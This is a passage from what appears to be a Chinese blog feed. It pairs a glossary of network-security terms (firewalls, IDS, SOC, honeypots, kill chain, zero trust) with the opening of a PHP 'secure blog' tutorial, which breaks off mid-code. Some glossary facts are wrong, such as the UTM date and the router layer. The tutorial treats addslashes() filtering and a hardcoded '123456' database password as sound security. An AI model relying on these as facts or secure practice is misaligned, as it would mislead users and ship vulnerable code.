title="CA证书"></a>CA证书</h3><blockquote><p>为实现双方安全通信提供了电子认证。</p><p>在因特网、公司内部网或外部网中，使用数字证书实现身份识别和电子信息加密。</p><p>数字证书中含有密钥对（公钥和私钥）所有者的识别信息，通过验证识别信息的真伪实现对证书持有者身份的认证。</p></blockquote><h3 id="SSL证书"><a href="#SSL证书" class="headerlink" title="SSL证书"></a>SSL证书</h3><blockquote><p>SSL证书是数字证书的一种，类似于驾驶证、护照和营业执照的电子副本。</p><p>因为配置在服务器上，也称为SSL服务器证书。</p></blockquote><h3 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h3><blockquote><p>主要<strong>部署于不同网络或网络安全域之间的出口</strong>，通过监测、限制、更改跨越防火墙的数据流，尽可能地对外部屏蔽网络内部的信息、结构和运行状况，有选择地接受外部访问。</p></blockquote><h3 id="IDS"><a href="#IDS" class="headerlink" title="IDS"></a>IDS</h3><blockquote><p>入侵检测系统，<strong>用于在黑客发起进攻或是发起进攻之前检测到攻击，并加以拦截</strong>。</p><p>IDS是不同于防火墙。防火墙只能<strong>屏蔽入侵</strong>，而IDS却可以在<strong>入侵发生以前，通过一些信息来检测到即将发生的攻击或是入侵并作出反应</strong>。</p></blockquote><h3 id="NIDS"><a href="#NIDS" class="headerlink" title="NIDS"></a>NIDS</h3><blockquote><p>NetworkIntrusion Detection System的缩写，即网络入侵检测系统，主要用于检测Hacker或Cracker。</p></blockquote><p>通过网络进行的入侵行为。NIDS的运行方式有两种，一种是在目标主机上运行以监测其本身的通信信息，另一种是在一台单独的机器上运行以监测所有网络设备的通信信息，比如Hub、路由器。</p><h3 id="IPS"><a href="#IPS" class="headerlink" title="IPS"></a>IPS</h3><blockquote><p>IPS全称为Intrusion-PreventionSystem，即入侵防御系统，目的在于及时识别攻击程序或有害代码及其克隆和变种，采取预防措施，先其阻止入侵，防患于未然。</p><p>或者至少使其危害性充分降低。入侵预防系统一般作为防火墙和防病毒软件的补充来投入使用。</p></blockquote><h3 id="杀毒软件"><a href="#杀毒软件" class="headerlink" title="杀毒软件"></a>杀毒软件</h3><blockquote><p>也称反病毒软件或防毒软件，是用于消除电脑病毒、特洛伊木马和恶意软件等计算机威胁的一类软件。</p></blockquote><h3 id="反病毒引擎"><a href="#反病毒引擎" class="headerlink" title="反病毒引擎"></a>反病毒引擎</h3><p>通俗理解，就是一套<strong>判断特定程序行为是否为病毒程序（包括可疑的）的技术机制</strong>。</p><h3 id="防毒墙"><a href="#防毒墙" class="headerlink" title="防毒墙"></a>防毒墙</h3><blockquote><p>区别于部署在主机上的杀毒软件，防毒墙的部署方式与防火墙类似，主要部署于网络出口，用于对病毒进行扫描和拦截，因此防毒墙也被称为反病毒网关。</p></blockquote><h3 id="告警"><a href="#告警" class="headerlink" title="告警"></a>告警</h3><blockquote><p>指网络安全设备对攻击行为产生的警报。</p></blockquote><h3 id="误报"><a href="#误报" class="headerlink" title="误报"></a>误报</h3><blockquote><p>也称为无效告警，通常指告警错误，即把合法行为判断成非法行为而产生了告警。</p><p>目前，由于攻击技术的快速进步和检测技术的限制，误报的数量非常大，使得安全人员不得不花费大量时间来处理此类告警，已经成为困扰并拉低日常安全处置效率的主要原因。</p></blockquote><h3 id="漏报"><a href="#漏报" class="headerlink" title="漏报"></a>漏报</h3><blockquote><p>通常指网络安全设备没有检测出非法行为而没有产生告警。一旦出现漏报，将大幅增加系统被入侵的风险。</p></blockquote><h3 id="NAC"><a href="#NAC" class="headerlink" title="NAC"></a>NAC</h3><blockquote><p>全称为NetworkAccess Control，即<strong>网络准入控制</strong>，其宗旨是<strong>防止病毒和蠕虫等新兴黑客技术对企业安全造成危害</strong>。</p><p>借助NAC，客户可以只允许合法的、值得信任的终端设备（例如PC、服务器、PDA）接入网络，而不允许其它设备接入。</p></blockquote><h3 id="漏扫"><a href="#漏扫" class="headerlink" title="漏扫"></a>漏扫</h3><blockquote><p>即漏洞扫描，指<strong>基于漏洞数据库</strong>，<strong>通过扫描等手段对指定的远程或者本地计算机系统的安全脆弱性进行检测</strong>，发现可利用漏洞的一种安全检测（渗透攻击）行为。</p></blockquote><h3 id="UTM"><a href="#UTM" class="headerlink" title="UTM"></a>UTM</h3><blockquote><p>即UnifiedThreatManagement，中文名为统一威胁管理，最早由IDC于2014年提出。</p><p>即将不同设备的安全能力（最早包括入侵检测、防火墙和反病毒技术），集中在同一网关上，实现统一管理和运维。</p></blockquote><h3 id="网闸"><a href="#网闸" class="headerlink" title="网闸"></a>网闸</h3><blockquote><p>网闸是使用带有多种控制功能的固态开关读写介质，连接两个独立主机系统的信息安全设备。</p><p>由于两个独立的主机系统通过网闸进行隔离，只有以数据文件形式进行的无协议摆渡。</p></blockquote><h3 id="堡垒机"><a href="#堡垒机" class="headerlink" title="堡垒机"></a>堡垒机</h3><blockquote><p>运用各种技术手段监控和记录运维人员对网络内的服务器、网络设备、安全设备、数据库等设备的操作行为，以便集中报警、及时处理及审计定责。</p></blockquote><h3 id="数据库审计"><a href="#数据库审计" class="headerlink" title="数据库审计"></a>数据库审计</h3><blockquote><p>能够实时记录网络上的数据库活动，对数据库操作进行细粒度审计的合规性管理，对数据库遭受到的风险行为进行告警，对攻击行为进行阻断。</p><p>它通过对用户访问数据库行为的记录、分析和汇报，用来帮助用户事后生成合规报告、事故追根溯源，同时加强内外部数据库网络行为记录，提高数据资产安全。</p></blockquote><h3 id="DLP"><a href="#DLP" class="headerlink" title="DLP"></a>DLP</h3><blockquote><p>数据防泄漏，通过数字资产的精准识别和策略制定，主要用于防止企业的指定数据或信息资产以违反安全策略规定的形式流出企业。</p></blockquote><h3 id="VPN"><a href="#VPN" class="headerlink" title="VPN"></a>VPN</h3><blockquote><p>虚拟专用网，在公用网络上建立专用网络，进行加密通讯，通过对数据包的加密和数据包目标地址的转换实现远程访问。</p></blockquote><h3 id="SD-WAN"><a href="#SD-WAN" class="headerlink" title="SD-WAN"></a>SD-WAN</h3><blockquote><p>即软件定义广域网，这种服务用于连接广阔地理范围的企业网络、数据中心、互联网应用及云服务。</p><p>这种服务的典型特征是将网络控制能力通过软件方式云化。</p><p>通常情况下，SD-WAN都集成有防火墙、入侵检测或者防病毒能力。并且从目前的趋势来看，以安全为核心设计的SD-WAN正在崭露头角，包括奇安信、Fortinet等多家安全厂商开始涉足该领域，并提供了较为完备的内生安全设计。</p></blockquote><h3 id="路由器-1"><a href="#路由器-1" class="headerlink" title="路由器"></a>路由器</h3><blockquote><p>是用来连接不同子网的中枢，它们工作于OSI7层模型的传输层和网络层。</p><p>路由器的基本功能就是将网络信息包传输到它们的目的地。一些路由器还有访问控制列表（ACLs），允许将不想要的信息包过滤出去。</p><p>许多路由器都可以将它们的日志信息注入到IDS系统中，并且自带基础的包过滤（即防火墙）功能。</p></blockquote><h3 id="网关"><a href="#网关" class="headerlink" title="网关"></a>网关</h3><blockquote><p>通常指路由器、防火墙、IDS、VPN等边界网络设备。</p></blockquote><h3 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h3><blockquote><p>即WebApplicationFirewall，即Web应用防火墙，是通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护的一款产品。</p></blockquote><h3 id="SOC"><a href="#SOC" class="headerlink" title="SOC"></a>SOC</h3><blockquote><p>即SecurityOperationsCenter，翻译为安全运行中心或者安全管理平台，通过建立一套实时的资产风险模型，协助管理员进行事件分析、风险分析、预警管理和应急响应处理的集中安全管理系统。</p></blockquote><h3 id="LAS"><a href="#LAS" class="headerlink" title="LAS"></a>LAS</h3><blockquote><p>日志审计系统，主要功能是提供日志的收集、检索和分析能力，可为威胁检测提供丰富的上下文。</p></blockquote><h3 id="NOC"><a href="#NOC" class="headerlink" title="NOC"></a>NOC</h3><blockquote><p>即NetworkOperationsCenter，网络操作中心或网络运行中心，是远程网络通讯的管理、监视和维护中心，是网络问题解决、软件分发和修改、路由、域名管理、性能监视的焦点。</p></blockquote><h3 id="SIEM"><a href="#SIEM" class="headerlink" title="SIEM"></a>SIEM</h3><blockquote><p>即SecurityInformation and EventManagement，安全信息和事件管理，负责从大量企业安全控件、主机操作系统、企业应用和企业使用的其他软件收集安全日志数据，并进行分析和报告。</p></blockquote><h3 id="上网行为管理"><a href="#上网行为管理" class="headerlink" title="上网行为管理"></a>上网行为管理</h3><blockquote><p>是指帮助互联网用户控制和管理对互联网使用的设备。</p><p>其包括对网页访问过滤、上网隐私保护、网络应用控制、带宽流量管理、信息收发审计、用户行为分析等。</p></blockquote><h3 id="蜜罐（Honeypot）"><a href="#蜜罐（Honeypot）" class="headerlink" title="蜜罐（Honeypot）"></a>蜜罐（Honeypot）</h3><blockquote><p>是一个包含漏洞的系统，它摸拟一个或多个易受攻击的主机，给黑客提供一个容易攻击的目标。</p><p><strong>由于蜜罐没有其它任务需要完成，因此所有连接的尝试都应被视为是可疑的。</strong></p><p>蜜罐的另一个用途是拖延攻击者对其真正目标的攻击，让攻击者在蜜罐上浪费时间。蜜罐类产品包括蜜网、蜜系统、蜜账号等等。</p></blockquote><h3 id="沙箱"><a href="#沙箱" class="headerlink" title="沙箱"></a>沙箱</h3><blockquote><p>沙箱是一种用于安全的运行程序的机制。它常常用来执行那些非可信的程序。</p><p>非可信程序中的恶意代码对系统的影响将会被限制在沙箱内而不会影响到系统的其它部分。</p></blockquote><h3 id="沙箱逃逸"><a href="#沙箱逃逸" class="headerlink" title="沙箱逃逸"></a>沙箱逃逸</h3><blockquote><p>一种识别沙箱环境，并利用静默、欺骗等技术，绕过沙箱检测的现象</p></blockquote><h3 id="网络靶场"><a href="#网络靶场" class="headerlink" title="网络靶场"></a>网络靶场</h3><blockquote><p>主要是指通过虚拟环境与真实设备相结合，模拟仿真出真实赛博网络空间攻防作战环境，能够支撑攻防演练、安全教育、网络空间作战能力研究和网络武器装备验证试验平台。</p></blockquote><h3 id="加密技术-1"><a href="#加密技术-1" class="headerlink" title="加密技术"></a>加密技术</h3><blockquote><p>加密技术包括两个元素：算法和密钥。</p><p>算法是将普通的文本与一串数字（密钥）的结合，产生不可理解的密文的步骤，密钥是用来对数据进行编码和解码的一种算法。</p><p>密钥加密技术的密码体制分为对称密钥体制和非对称密钥体制两种。相应地，对数据加密的技术分为两类，即对称加密（私人密钥加密）和非对称加密（公开密钥加密）。对称加密的加密密钥和解密密钥相同，而非对称加密的加密密钥和解密密钥不同，加密密钥可以公开而解密密钥需要保密。</p></blockquote><h3 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h3><blockquote><p>顾名思义，黑名单即不好的名单，凡是在黑名单上的软件、IP地址等，都被认为是非法的。</p></blockquote><h3 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h3><blockquote><p>与黑名单对应，白名单即“好人”的名单，凡是在白名单上的软件、IP等，都被认为是合法的，可以在计算机上运行。</p></blockquote><h3 id="边界防御"><a href="#边界防御" class="headerlink" title="边界防御"></a>边界防御</h3><blockquote><p>以网络边界为核心的防御模型，以静态规则匹配为基础，强调把所有的安全威胁都挡在外网。</p></blockquote><h3 id="南北向流量"><a href="#南北向流量" class="headerlink" title="南北向流量"></a>南北向流量</h3><blockquote><p>通常指<strong>数据中心内外部通信</strong>所产生的的流量。</p></blockquote><h3 id="东西向流量"><a href="#东西向流量" class="headerlink" title="东西向流量"></a>东西向流量</h3><blockquote><p>通常指<strong>数据中心内部不同主机之间互相通信</strong>所产生的的流量。</p></blockquote><h3 id="规则库"><a href="#规则库" class="headerlink" title="规则库"></a>规则库</h3><blockquote><p>网络安全的核心数据库，类似于黑白名单，用于存储大量安全规则，一旦访问行为和规则库完成匹配，则被认为是非法行为。所以有人也将规则库比喻为网络空间的法律。</p></blockquote><h3 id="下一代"><a href="#下一代" class="headerlink" title="下一代"></a>下一代</h3><blockquote><p>网络安全领域经常用到，用于表示产品或者技术有较大幅度的创新，在能力上相对于传统方法有明显的进步，通常缩写为NG（NextGen）。</p><p>例如NGFW（下一代防火墙）、NGSOC（下一代安全管理平台）等。</p></blockquote><h3 id="大数据安全分析"><a href="#大数据安全分析" class="headerlink" title="大数据安全分析"></a>大数据安全分析</h3><blockquote><p>区别于传统被动规则匹配的防御模式，以主动收集和分析大数据的方法，找出其中可能存在的安全威胁，因此也称数据驱动安全。</p></blockquote><ol><li><h1 id="安全可视化"><a href="#安全可视化" class="headerlink" title="安全可视化"></a>安全可视化</h1></li></ol><p>指在网络安全领域中的呈现技术，将网络安全加固、检测、防御、响应等过程中的数据和结果转换成图形界面，并通过人机交互的方式进行搜索、加工、汇总等操作的理论、方法和技术。</p><h3 id="NTA"><a href="#NTA" class="headerlink" title="NTA"></a>NTA</h3><blockquote><p>网络流量分析（NTA）的概念是Gartner于2013年首次提出的，位列五种检测高级威胁的手段之一。</p><p>它融合了传统的基于规则的检测技术，以及机器学习和其他高级分析技术，用以检测企业网络中的可疑行为，尤其是失陷后的痕迹。</p></blockquote><h3 id="安全运营"><a href="#安全运营" class="headerlink" title="安全运营"></a>安全运营</h3><blockquote><p>贯穿产品研发、业务运行、漏洞修复、防护与检测、应急响应等一系列环节，<strong>实行系统的管理方法和流程，将各个环节的安全防控作用有机结合，保障整个业务的安全性</strong>。</p></blockquote><h3 id="威胁情报"><a href="#威胁情报" class="headerlink" title="威胁情报"></a>威胁情报</h3><blockquote><p>根据Gartner的定义，威胁情报是某种基于证据的知识，包括上下文、机制、标示、含义和能够执行的建议，这些知识与资产所面临已有的或酝酿中的威胁或危害相关，可用于资产相关主体对威胁或危害的响应或处理决策提供信息支持。根据使用对象的不同，威胁情报主要分为人读情报和机读情报。</p></blockquote><h3 id="TTP"><a href="#TTP" class="headerlink" title="TTP"></a>TTP</h3><blockquote><p>主要包括三要素，战术Tactics、技术Techniques和过程Procedures，是描述高级威胁组织及其攻击的重要指标，作为威胁情报的一种重要组成部分，TTP可为安全分析人员提供决策支撑。</p></blockquote><h3 id="IOC"><a href="#IOC" class="headerlink" title="IOC"></a>IOC</h3><blockquote><p>中文名为失陷标示：用以发现内部被APT团伙、木马后门、僵尸网络控制的失陷主机，类型上往往是域名、URL等。</p><p>目前而言，IOC是应用最为广泛的威胁情报，因为其效果最为直接。一经匹配，则意味着存在已经失陷的主机。</p></blockquote><h3 id="杀伤链"><a href="#杀伤链" class="headerlink" title="杀伤链"></a>杀伤链</h3><blockquote><p>杀伤链最早来源于军事领域，用于描述进攻一方各个阶段的状态。</p><p>在网络安全领域，这一概念最早由洛克希德-马丁公司提出，英文名称为KillChain，也称作网络攻击生命周期，包括侦查追踪、武器构建、载荷投递、漏洞利用、安装植入、命令控制、目标达成等七个阶段，来识别和防止入侵。</p></blockquote><h3 id="ATT-amp-CK"><a href="#ATT-amp-CK" class="headerlink" title="ATT&amp;CK"></a>ATT&amp;CK</h3><blockquote><p>可以简单理解为描述攻击者技战术的知识库。</p><p>MITRE在2013年推出了该模型，它是根据真实的观察数据来描述和分类对抗行为。ATT&amp;CK将已知攻击者行为转换为结构化列表，将这些已知的行为汇总成战术和技术，并通过几个矩阵以及结构化威胁信息表达式（STIX）、指标信息的可信自动化交换（TAXII）来表示。</p></blockquote><h3 id="态势感知"><a href="#态势感知" class="headerlink" title="态势感知"></a>态势感知</h3><blockquote><p>是一种基于环境的、动态、整体地洞悉安全风险的能力，是以安全大数据为基础，从全局视角提升对安全威胁的发现识别、理解分析、响应处置能力的一种方式，最终是为了决策与行动，是安全能力的落地。</p></blockquote><h3 id="探针"><a href="#探针" class="headerlink" title="探针"></a>探针</h3><blockquote><p>也叫作网络安全探针或者安全探针，可以简单理解为赛博世界的摄像头，部署在网络拓扑的关键节点上，用于收集和分析流量和日志，发现异常行为，并对可能到来的攻击发出预警。</p></blockquote><h3 id="包检测"><a href="#包检测" class="headerlink" title="包检测"></a>包检测</h3><blockquote><p>对于流量包、数据包进行拆包、检测的行为。</p></blockquote><h3 id="元数据"><a href="#元数据" class="headerlink" title="元数据"></a>元数据</h3><blockquote><p>元数据（Metadata），又称中介数据、中继数据，为描述数据的数据（dataabout data），主要是描述数据属性（property）的信息，用来支持如指示存储位置、历史数据、资源查找、文件记录等功能。</p></blockquote><h3 id="欺骗检测"><a href="#欺骗检测" class="headerlink" title="欺骗检测"></a>欺骗检测</h3><blockquote><p>以构造虚假目标来欺骗并诱捕攻击者，从而达到延误攻击节奏，检测和分析攻击行为的目的。</p></blockquote><h3 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h3><blockquote><p>常见于逆向工程或者逆向分析，简单而言，一切从产品中提取原理及设计信息并应用于再造及改进的行为，都是逆向工程。在网络安全中，更多的是调查取证、恶意软件分析等。</p></blockquote><h3 id="爬虫"><a href="#爬虫" class="headerlink" title="爬虫"></a>爬虫</h3><blockquote><p>网络爬虫（又称为网页蜘蛛，网络机器人，在FOAF社区中间，更经常的称为网页追逐者），是一种按照一定的规则，自动地抓取万维网信息的程序或者脚本。</p></blockquote><h3 id="防爬"><a href="#防爬" class="headerlink" title="防爬"></a>防爬</h3><blockquote><p>意为防爬虫，主要是指防止网络爬虫从自身网站中爬取信息。网络爬虫是一种按照一定的规则，自动地抓取网络信息的程序或者脚本。</p></blockquote><h3 id="零信任"><a href="#零信任" class="headerlink" title="零信任"></a>零信任</h3><blockquote><p>零信任并不是不信任，而是作为一种新的身份认证和访问授权理念，不再以网络边界来划定可信或者不可信，而是默认不相信任何人、网络以及设备，采取动态认证和授权的方式，把访问者所带来的的网络安全风险降到最低。</p></blockquote><h3 id="拟态防御"><a href="#拟态防御" class="headerlink" title="拟态防御"></a>拟态防御</h3><blockquote><p>核心实现是一种基于网络空间内生安全机理的动态异构冗余构造（DynamicHeterogeneousRedundancy，DHR)，为应对网络空间中基于未知漏洞、后门或病毒木马等的未知威胁，提供具有普适创新意义的防御理论和方法。</p></blockquote><h3 id="区块链"><a href="#区块链" class="headerlink" title="区块链"></a>区块链</h3><blockquote><p>英文名为blockchain，它是一个共享数据库，存储于其中的数据或信息，具有“不可伪造”、“全程留痕”、“可以追溯”、“公开透明”、“集体维护”等特征。</p></blockquote><h3 id="远程浏览器"><a href="#远程浏览器" class="headerlink" title="远程浏览器"></a>远程浏览器</h3><blockquote><p>鉴于浏览器往往成为黑客攻击的入口，因此将浏览器部署在远程的一个“浏览器服务器池”中。</p><p>这样一来，这些浏览器所在的服务器跟用户所在环境中的终端和网络是隔离的，从而使得客户所在网络的暴露面大大降低。</p><p>这种服务也类似于虚拟桌面、云手机等产品。</p></blockquote><h3 id="渗透测试-1"><a href="#渗透测试-1" class="headerlink" title="渗透测试"></a>渗透测试</h3><blockquote><p>为了证明网络防御按照预期计划正常运行而提供的一种机制，通常会邀请专业公司的攻击团队，按照一定的规则攻击既定目标，从而找出其中存在的漏洞或者其他安全隐患，并出具测试报告和整改建议。</p><p>其目的在于不断提升系统的安全性。</p></blockquote><h3 id="安全众测"><a href="#安全众测" class="headerlink" title="安全众测"></a>安全众测</h3><blockquote><p>借助众多白帽子的力量，针对目标系统在规定时间内进行漏洞悬赏测试。</p><p>您在收到有效的漏洞后，按漏洞风险等级给予白帽子一定的奖励。通常情况下是按漏洞付费，性价比较高。</p><p>同时，不同白帽子的技能研究方向可能不同，在进行测试的时候更为全面。</p></blockquote><h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><blockquote><p>顾名思义就是检查源代码中的安全缺陷，检查程序源代码是否存在安全隐患，或者有编码不规范的地方，通过自动化工具或者人工审查的方式，对程序源代码逐条进行检查和分析，发现这些源代码缺陷引发的安全漏洞，并提供代码修订措施和建议。</p></blockquote><h3 id="NTLM验证"><a href="#NTLM验证" class="headerlink" title="NTLM验证"></a>NTLM验证</h3><blockquote><p>NTLM(NTLAN Manager)是微软公司开发的一种身份验证机制，从NT4开始就一直使用，主要用于本地的帐号管理。</p></blockquote><h3 id="数据脱敏"><a href="#数据脱敏" class="headerlink" title="数据脱敏"></a>数据脱敏</h3><blockquote><p>数据脱敏是指对某些敏感信息通过脱敏规则进行数据的变形，实现敏感隐私数据的可靠保护，主要用于数据的共享和交易等涉及大范围数据流动的场景。</p></blockquote><h3 id="SRC"><a href="#SRC" class="headerlink" title="SRC"></a>SRC</h3><blockquote><p>即SecurityResponse Center，中文名为安全应急响应中心，主要职责为挖掘并公开收集机构存在的漏洞和其他安全隐患。</p></blockquote><p>CISO</p><blockquote><p>有时也被叫做CSO，即首席信息安全官，为机构的主要安全负责人。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 术语 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php编写博客</title>
      <link href="/2021/07/13/60-zhi-day9/"/>
      <url>/2021/07/13/60-zhi-day9/</url>
      
        <content type="html"><![CDATA[<h1 id="php安全开发博客系统"><a href="#php安全开发博客系统" class="headerlink" title="php安全开发博客系统"></a>php安全开发博客系统</h1><p>进行一个php+html+mysql博客安全开发</p><span id="more"></span><h2 id="表的创建"><a href="#表的创建" class="headerlink" title="表的创建"></a>表的创建</h2><p>我们首先在phpstudy上创建网站，并且创建数据库</p><p><img src="/2021/07/13/60-zhi-day9/image-20210713150054842.png" alt="image-20210713150054842"></p><p>我们在创建的数据库中创建表</p><p><img src="/2021/07/13/60-zhi-day9/image-20210713150128850.png" alt="image-20210713150128850"></p><p><img src="/2021/07/13/60-zhi-day9/image-20210713150230859.png" alt="image-20210713150230859"></p><h2 id="网站目录创建和数据库引擎创建"><a href="#网站目录创建和数据库引擎创建" class="headerlink" title="网站目录创建和数据库引擎创建"></a>网站目录创建和数据库引擎创建</h2><p>我们在ps上创建好项目，在对应位置创建好目录如下左边部分</p><p><img src="/2021/07/13/60-zhi-day9/image-20210713150410040.png" alt="image-20210713150410040"></p><p>然后我们进行数据库连接</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$username</span><span class="token operator">=</span><span class="token string double-quoted-string">"www_phpcblog_com"</span><span class="token punctuation">;</span><span class="token variable">$password</span><span class="token operator">=</span><span class="token string double-quoted-string">"123456"</span><span class="token punctuation">;</span><span class="token variable">$host</span><span class="token operator">=</span><span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">;</span><span class="token variable">$dbname</span><span class="token operator">=</span><span class="token string double-quoted-string">"www_phpcblog_com"</span><span class="token punctuation">;</span><span class="token variable">$conn</span><span class="token operator">=</span><span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">,</span><span class="token variable">$dbname</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//判断数据库是否连接</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token operator">-&gt;</span><span class="token property">connect_error</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"数据库连接失败"</span><span class="token operator">.</span><span class="token variable">$conn</span><span class="token operator">-&gt;</span><span class="token property">connect_error</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$conn</span><span class="token operator">-&gt;</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'set names utf8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/07/13/60-zhi-day9/image-20210713150545806.png" alt="image-20210713150545806"></p><p>无报错信息显然数据库连接成功！</p><h2 id="后台登陆模板的处理和安全过滤"><a href="#后台登陆模板的处理和安全过滤" class="headerlink" title="后台登陆模板的处理和安全过滤"></a>后台登陆模板的处理和安全过滤</h2><p>部分login.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span><span class="token operator">!</span>doctype html<span class="token operator">&gt;</span><span class="token operator">&lt;</span>html<span class="token operator">&gt;</span><span class="token operator">&lt;</span>head<span class="token operator">&gt;</span>    <span class="token operator">&lt;</span>meta charset<span class="token operator">=</span><span class="token string double-quoted-string">"UTF-8"</span><span class="token operator">/</span><span class="token operator">&gt;</span>    <span class="token operator">&lt;</span>title<span class="token operator">&gt;</span>『晓莎<span class="token constant">K</span>』后台管理<span class="token operator">&lt;</span><span class="token operator">/</span>title<span class="token operator">&gt;</span>    <span class="token operator">&lt;</span>link rel<span class="token operator">=</span><span class="token string double-quoted-string">"stylesheet"</span> type<span class="token operator">=</span><span class="token string double-quoted-string">"text/css"</span> href<span class="token operator">=</span><span class="token string double-quoted-string">"css/admin_login.css"</span><span class="token operator">/</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>head<span class="token operator">&gt;</span><span class="token operator">&lt;</span>body<span class="token operator">&gt;</span><span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string double-quoted-string">"admin_login_wrap"</span><span class="token operator">&gt;</span>    <span class="token operator">&lt;</span>h1<span class="token operator">&gt;</span>后台管理<span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">&gt;</span>    <span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string double-quoted-string">"adming_login_border"</span><span class="token operator">&gt;</span>        <span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string double-quoted-string">"admin_input"</span><span class="token operator">&gt;</span>            <span class="token operator">&lt;</span>form action<span class="token operator">=</span><span class="token string double-quoted-string">""</span> method<span class="token operator">=</span><span class="token string double-quoted-string">"post"</span> onsubmit<span class="token operator">=</span><span class="token string double-quoted-string">"return check(this)"</span><span class="token operator">&gt;</span>                <span class="token operator">&lt;</span>ul <span class="token keyword">class</span><span class="token operator">=</span><span class="token string double-quoted-string">"admin_items"</span><span class="token operator">&gt;</span>                    <span class="token operator">&lt;</span>li<span class="token operator">&gt;</span>                        <span class="token operator">&lt;</span>label <span class="token keyword">for</span><span class="token operator">=</span><span class="token string double-quoted-string">"username"</span><span class="token operator">&gt;</span>用户名：<span class="token operator">&lt;</span><span class="token operator">/</span>label<span class="token operator">&gt;</span>                        <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string double-quoted-string">"text"</span> name<span class="token operator">=</span><span class="token string double-quoted-string">"username"</span>  id<span class="token operator">=</span><span class="token string double-quoted-string">"username"</span> size<span class="token operator">=</span><span class="token string double-quoted-string">"40"</span> <span class="token keyword">class</span><span class="token operator">=</span><span class="token string double-quoted-string">"admin_input_style"</span> <span class="token operator">/</span><span class="token operator">&gt;</span>                    <span class="token operator">&lt;</span><span class="token operator">/</span>li<span class="token operator">&gt;</span>                    <span class="token operator">&lt;</span>li<span class="token operator">&gt;</span>                        <span class="token operator">&lt;</span>label <span class="token keyword">for</span><span class="token operator">=</span><span class="token string double-quoted-string">"password"</span><span class="token operator">&gt;</span>密码：<span class="token operator">&lt;</span><span class="token operator">/</span>label<span class="token operator">&gt;</span>                        <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string double-quoted-string">"password"</span> name<span class="token operator">=</span><span class="token string double-quoted-string">"password"</span>  id<span class="token operator">=</span><span class="token string double-quoted-string">"password"</span> size<span class="token operator">=</span><span class="token string double-quoted-string">"40"</span> <span class="token keyword">class</span><span class="token operator">=</span><span class="token string double-quoted-string">"admin_input_style"</span> <span class="token operator">/</span><span class="token operator">&gt;</span>                    <span class="token operator">&lt;</span><span class="token operator">/</span>li<span class="token operator">&gt;</span>                    <span class="token operator">&lt;</span>li<span class="token operator">&gt;</span>                        <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string double-quoted-string">"submit"</span> tabindex<span class="token operator">=</span><span class="token string double-quoted-string">"3"</span> value<span class="token operator">=</span><span class="token string double-quoted-string">"提交"</span> name<span class="token operator">=</span><span class="token string double-quoted-string">"sub"</span> <span class="token keyword">class</span><span class="token operator">=</span><span class="token string double-quoted-string">"btn btn-primary"</span> <span class="token operator">/</span><span class="token operator">&gt;</span>                    <span class="token operator">&lt;</span><span class="token operator">/</span>li<span class="token operator">&gt;</span>                <span class="token operator">&lt;</span><span class="token operator">/</span>ul<span class="token operator">&gt;</span>            <span class="token operator">&lt;</span><span class="token operator">/</span>form<span class="token operator">&gt;</span>        <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>    <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>安全过滤function.php</p><p>如果是特殊字符，我们使用addslashes()函数对他们进行转义</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//自定义的过滤函数 过滤 gpc 过滤特殊字符</span><span class="token keyword">function</span> <span class="token function-definition function">filterstr</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span 